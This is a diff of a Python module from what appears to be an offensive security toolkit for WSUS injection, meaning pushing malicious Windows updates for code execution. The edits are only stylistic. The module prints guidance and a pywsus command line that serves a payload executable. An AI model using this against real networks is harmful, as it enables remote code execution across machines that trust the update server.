@@ -1,6 +1,5 @@
 """WSUS injection — SharpWSUS/pywsus for code execution via Windows Update."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -19,14 +18,14 @@ def run(args: Any) -> int:
     target = getattr(args, "target", None)
 
     print("[*] WSUS Abuse: inject malicious update via Windows Update Services")
-    print("[*] Target: {}".format(target))
+    print(f"[*] Target: {target}")
     print("[*] Requires: write access to WSUS server or MITM position")
 
     import subprocess
     import shutil
     pywsus = shutil.which("pywsus") or shutil.which("pywsus.py")
     if pywsus:
-        print("[*] pywsus found: {}".format(pywsus))
+        print(f"[*] pywsus found: {pywsus}")
         print("[*] Usage: pywsus.py --host <WSUS> --port 8530 --executable payload.exe --command '/install'")
     else:
         print("[*] Tools: SharpWSUS (.NET), pywsus (Python)")
